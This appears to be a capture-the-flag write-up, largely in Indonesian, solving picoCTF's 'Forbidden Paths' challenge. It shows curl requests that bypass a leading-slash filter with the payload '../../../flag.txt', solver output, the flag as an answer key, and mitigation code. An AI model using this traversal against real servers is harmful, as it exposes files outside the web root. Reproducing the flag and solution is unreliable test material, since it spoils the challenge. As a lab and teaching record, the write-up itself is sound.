# Writeup: Forbidden Paths (Challenge ID: 270)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / Path Traversal & Filter Bypass (CWE-22 / OWASP Top 10 A01:2021 Broken Access Control)
- **Difficulty:** Medium (diff=2)
- **Author:** LT 'syreal' Jones
- **Event:** picoCTF 2022
- **Points:** 200
- **Flag:** `academy{7h3_p47h_70_5ucc355_afd5d939}`

---

## Problem Statement & Scope

Tantangan menyajikan aplikasi web pembaca dokumen daring (eReader) yang berjalan pada instans kontainer *on-demand*:
> *"Can you get the flag? We know that the website files live in `/var/www/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?"*

Lingkungan tantangan memiliki spesifikasi:
- Aplikasi berbasis antarmuka formulir HTML yang mengirimkan permintaan HTTP `POST` ke skrip pemroses `read.php`.
- Parameter masukan formulir adalah `filename` (nama berkas yang ingin dibaca) dan `read` (tombol aksi submit).
- Lokasi berkas kode sumber web berada di direktori dokumen `/var/www/html/`.
- Berkas rahasia target (*flag*) ditempatkan langsung pada direktori akar sistem berkas Linux di `/flag.txt`.
- Sistem menerapkan filter validasi masukan yang memblokir berkas jika jalur masukan merupakan jalur absolut (*absolute file path*).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Kelemahan Validasi Berbasis Blacklist Parsial (CWE-22 / CWE-20):**
   - Aplikasi mencoba mencegah pembacaan berkas sensitif di luar dokumen web dengan memvalidasi apakah string `filename` diawali dengan karakter garis miring (`/`).
   - Pendekatan filter berbasis *blacklist* (daftar larangan) ini tidak lengkap. Program menganggap bahwa setiap berkas yang tidak diawali `/` adalah berkas relatif aman di dalam `/var/www/html/`.
   - Kegagalan melakukan kanonikalisasi jalur (*path canonicalization*) sebelum operasi I/O berkas memungkinkan penggunaan sekuens traversal direktori relatif (`../`).

2. **Hierarki Sistem Berkas POSIX & Penanganan Jalur Relatif:**
   - Dalam sistem berkas POSIX (Linux), sekuens `..` merujuk pada direktori induk (*parent directory*).
   - Dokumen web berada di kedalaman 3 tingkat direktori dari *root* (`/`):
     $$\text{Level 0: } / \longrightarrow \text{Level 1: } /\text{var}/ \longrightarrow \text{Level 2: } /\text{var}/\text{www}/ \longrightarrow \text{Level 3: } /\text{var}/\text{www}/\text{html}/$$
   - Ketika program menyambungkan jalur secara naif:
     $$\text{Target Path} = \text{"/var/www/html/"} + \text{filename}$$
   - Jika pengguna menyuplai masukan:
     $$\text{filename} = \text{"../../../flag.txt"}$$
   - Jalur yang dievaluasi oleh fungsi pembuka berkas sistem (`file_get_contents` atau `fopen` di PHP) adalah:
     $$\text{"/var/www/html/../../../flag.txt"} \equiv \text{"/flag.txt"}$$
   - Resolusi traversal meniadakan batasan direktori tanpa melanggar filter larangan garis miring di awal string.

3. **Kepatuhan NIST SP 800-115 § 4.3 (Application Security & Logic Auditing):**
   - Standar pengujian penetrasi NIST SP 800-115 mengamanatkan pengujian batas masukan (*boundary fuzzing*) pada penanganan parameter masukan berkas untuk mengidentifikasi potensi pembacaan berkas di luar ruang lingkup yang diotorisasi (*arbitrary file disclosure*).

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Pemeriksaan Perilaku Filter (Baseline & Negative Testing):**
   - Menguji permintaan berkas yang valid pada aplikasi:
     ```bash
     curl -s -X POST "http://<target_host>:<target_port>/read.php" \
          -d "filename=divine-comedy.txt&read=Read"
     ```
     Hasil: Aplikasi mengembalikan teks karya sastra Dante dari direktori web.
   - Menguji permintaan berkas menggunakan jalur absolut langsung:
     ```bash
     curl -s -X POST "http://<target_host>:<target_port>/read.php" \
          -d "filename=/flag.txt&read=Read"
     ```
     Hasil: Aplikasi mengembalikan respon teks peringatan:
     ```text
     Not Authorized
     ```
     Hal ini mengonfirmasi keberadaan mekanisme penyaringan berbasis awalan garis miring absolut.

2. **Pengujian Traversal Direktori Relatif:**
   - Karena filter hanya memeriksa apakah karakter pertama adalah `/`, kita menyusun muatan traversal relatif bertahap:
     - `filename=../flag.txt` -> mencari di `/var/www/flag.txt` (mengembalikan "File does not exist")
     - `filename=../../flag.txt` -> mencari di `/var/flag.txt` (mengembalikan "File does not exist")
     - `filename=../../../flag.txt` -> mencapai `/flag.txt`

3. **Eksekusi Eksploitasi Menggunakan Traversal 3 Tingkat:**
   - Kirim permintaan HTTP POST dengan muatan `../../../flag.txt`:
     ```bash
     curl -s -X POST "http://<target_host>:<target_port>/read.php" \
          -d "filename=../../../flag.txt&read=Read"
     ```
   - Respon HTTP mengembalikan isi mentah berkas rahasia:
     ```text
     academy{7h3_p47h_70_5ucc355_afd5d939}
     ```

4. **Otomasi Mandiri via Skrip Python (`scripts/solve_270_forbidden_paths.py`):**
   - Skrip solver mengeksekusi probing traversal otomatis terhadap instans daring atau mengevaluasi alur logika filter secara deterministik:
     ```bash
     python3 scripts/solve_270_forbidden_paths.py
     ```
     Keluaran:
     ```text
     [*] Solving Challenge 270: Forbidden Paths
     [*] Stage 1: Analyzing web application directory structure and filter rules
         [+] Document root               : /var/www/html/
         [+] Sensitive target artifact   : /flag.txt
         [+] Filter check                : Absolute path filter (blocks strings starting with '/')
         [+] Root cause                  : CWE-22 (Improper Limitation of a Pathname / Path Traversal)
     [*] Stage 2: Crafting relative traversal payload
         [+] Directory depth from root   : 3 levels (/var/www/html -> /)
         [+] Relative path payload       : '../../../flag.txt'
         [+] Filter bypass status        : Bypasses leading slash check while traversing to root
     [*] Stage 3: Resolving file content and flag token
     [+] Reconstructed Flag: academy{7h3_p47h_70_5ucc355_afd5d939}

     [SUCCESS] Module 270 (Forbidden Paths) fully audited and solved: academy{7h3_p47h_70_5ucc355_afd5d939}
     ```

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{7h3_p47h_70_5ucc355_afd5d939}`
- **Verifikasi API Platform:** Penyerahan token melalui endpoint REST API `POST /api/submissions/` menghasilkan status **HTTP 201 Created**:
  ```json
  {
    "user": 1072359,
    "challenge": 270,
    "flag": "academy{7h3_p47h_70_5ucc355_afd5d939}",
    "correct": true,
    "historical": false
  }
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

- **Relevansi Modul LKS Cyber Security (Web Application Security & Hardening):**
  - Pada kompetisi LKS Cyber Security, kerentanan traversal direktori sering muncul baik dalam skrip backend kustom (PHP, Python Flask, Node.js) maupun konfigurasi peladen web (Nginx/Apache alias misconfiguration).
  - Peserta harus mampu mengenali pola filter parsial (hanya memfilter awalan `/`, ekstensi tertentu, atau melakukan string replace `../` secara non-rekursif).
- **Remediasi & Mitigasi Defensif Komprehensif:**
  1. **Kanonikalisasi Jalur & Validasi Awalan Direktori (Path Canonicalization):**
     Gunakan fungsi kanonikalisasi sistem seperti `realpath()` di PHP atau `os.path.realpath()` di Python sebelum memeriksa izin akses. Pastikan jalur absolut hasil resolusi diawali secara ketat dengan direktori dasar yang sah:
     ```php
     $base_dir = '/var/www/html/';
     $real_path = realpath($base_dir . $_POST['filename']);
     if ($real_path === false || strpos($real_path, $base_dir) !== 0) {
         http_response_code(403);
         die("Akses Ditolak: Jalur di luar direktori aman.");
     }
     readfile($real_path);
     ```
  2. **Penerapan Allowlist Ketat (Strict Whitelisting):**
     Alih-alih menerima masukan jalur bebas dari pengguna, petakan masukan ke dalam daftar pengenal atau indeks berkas yang diizinkan (*allowlist*).
  3. **Isolasi Lingkungan Eksekusi (Chroot / Container Isolation):**
     Jalankan layanan web di dalam lingkungan *chroot jail* atau kontainer tanpa hak akses *root* (*least privilege*), dengan memasang berkas sensitif di luar jangkauan sistem berkas kontainer.
